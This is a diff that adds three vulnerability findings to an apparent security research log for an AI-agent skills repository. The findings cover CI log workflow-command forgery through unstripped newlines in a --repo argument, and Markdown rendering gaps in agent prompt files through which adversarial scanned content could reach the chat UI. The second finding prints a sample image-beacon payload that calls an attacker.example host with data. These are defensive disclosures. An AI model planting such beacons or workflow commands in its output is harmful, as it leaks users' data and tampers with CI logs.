@@ -3030,3 +3030,58 @@ Generalize `scan_repo.mjs`'s git-host handling: replace the single hardcoded `gi
 Filed by Eva research run 31870162057 against `ievo-ai/eva` (research repo). Triage with `accepted` / `rejected` / `needs-discussion` labels.
 
 ---
+
+## S-2026-08-23-001 — scan_repo.mjs's --repo validation-failure error echo strips control chars but not raw \r/\n, enabling CI log workflow-command forgery
+
+```yaml
+id: S-2026-08-23-001
+discovered_at: 2026-08-23T00:00:00Z
+run_id: manual-research-session-2026-08-23
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's main() error-echo at line 882 strips CONTROL_CHAR_RE but not \r/\n before embedding args.repo into an errLog() message, letting a crafted --repo argument smuggle a GitHub Actions workflow command (::add-mask::/::stop-commands::) into a CI job's stderr log — the same class scan_repo.mjs's own sibling validate_agents.mjs/validate_skills.mjs just fixed (skills#648) but in a different file
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/650
+cwe: CWE-117
+confidence: medium
+location: plugins/ievo/scripts/scan_repo.mjs:84 (CONTROL_CHAR_RE definition), :882 (main, --repo validation-failure errLog)
+```
+
+`isValidOwnerRepo()`'s strict allowlist rejects any `--repo` value containing a raw newline, so a crafted value embedding `\n` plus a workflow-command token fails validation and falls into the error branch at line 882: `` errLog(`Error: repo must be in <owner>/<repo> format, got '${(args.repo ?? "").replace(CONTROL_CHAR_RE, "")}'`) ``. Directly re-read this run: `CONTROL_CHAR_RE` (line 84) is `/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f؜​-‏‪-‮⁠-⁩﻿]/g` — it deliberately excludes `\x09`/`\x0a`/`\x0d`, so the raw newline survives into the `console.error` output the community-index GitHub Actions workflow streams into its job log. `validate_agents.mjs`/`validate_skills.mjs` closed the identical gap in their own message sinks via a new `stripForDisplay()` helper in skills#648 (v0.80.20) — `scan_repo.mjs`'s error-echo paths were not touched by that fix and remain open.
+
+---
+
+## S-2026-08-23-002 — vuln-scanner.md/vuln-scan.md's excerpt-containment rule covers title/exploit_chain/recommendation/file/function but omits the preconditions array
+
+```yaml
+id: S-2026-08-23-002
+discovered_at: 2026-08-23T00:00:00Z
+run_id: manual-research-session-2026-08-23
+target_repo: ievo-ai/skills
+title: vuln-scanner.md's Step 2 Excerpt containment note and vuln-scan.md's Phase 4 Present results note both enumerate title/exploit_chain.*/recommendation/file/function as requiring backtick-fencing but never name the preconditions array, letting a crafted precondition string quoting adversarial scanned content render live Markdown (image/link beacon) when findings are displayed in the chat UI
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/651
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/vuln-scanner.md (Step 2 "Output structured JSON", Excerpt containment note); plugins/ievo/commands/vuln-scan.md (Phase 4 "Present results")
+```
+
+Directly re-read this run: `vuln-scanner.md`'s Excerpt containment note lists exactly `title`, the three `exploit_chain` sub-fields, `recommendation`, and (unconditionally) `file`/`function` as requiring backtick-fencing before any verbatim quote is written. `preconditions` is never named. `commands/vuln-scan.md`'s Phase 4 independently repeats the same field enumeration for display and separately instructs `Preconditions: what must be true for exploitation` to print straight from the field with no fencing instruction — the omission is consistent across both the finding-producing agent and the finding-rendering orchestrator. Preconditions commonly quote a specific config value/path/env-var name drawn from scanned source, a realistic vector for a crafted `![x](https://attacker.example/beacon.png?d=<data>)` payload to reach live Markdown rendering the moment scan results are displayed.
+
+---
+
+## S-2026-08-23-003 — deep-reviewer.md's finding-template short-title header renders unfenced — the Excerpt containment note scopes only to Issue:/Suggestion:
+
+```yaml
+id: S-2026-08-23-003
+discovered_at: 2026-08-23T00:00:00Z
+run_id: manual-research-session-2026-08-23
+target_repo: ievo-ai/skills
+title: deep-reviewer.md Step 3's finding template header (#### [severity] category — short title) is never named by the file's own Excerpt containment note, which is scoped explicitly to Issue:/Suggestion: only, unlike the adjacent File: field the template already wraps in backticks — distinct from already-open skills#633 (File: field) and skills#628 (coverage_caveats echo), a third rendering surface in the same file
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/652
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/deep-reviewer.md (Step 3 "Build structured output", finding template + Excerpt containment note)
+```
+
+Directly re-read this run: Step 3's "Excerpt containment" note is titled and scoped explicitly to `Issue:`/`Suggestion:` ("verbatim source quotes only"). The finding template's `#### [<severity>] <category> — <short title>` header is never named as requiring fencing, unlike `**File:** \`<path>\`` one line below it, which the template already wraps in backticks. `deep-review/SKILL.md`'s Step 5 renders the whole report, header lines included, as live Markdown in the Claude Code chat UI. A finding whose short title directly quotes a crafted line from adversarial diff content (plausible per this agent's own documented working-tree-mode input shape) could smuggle a live exfiltration beacon.
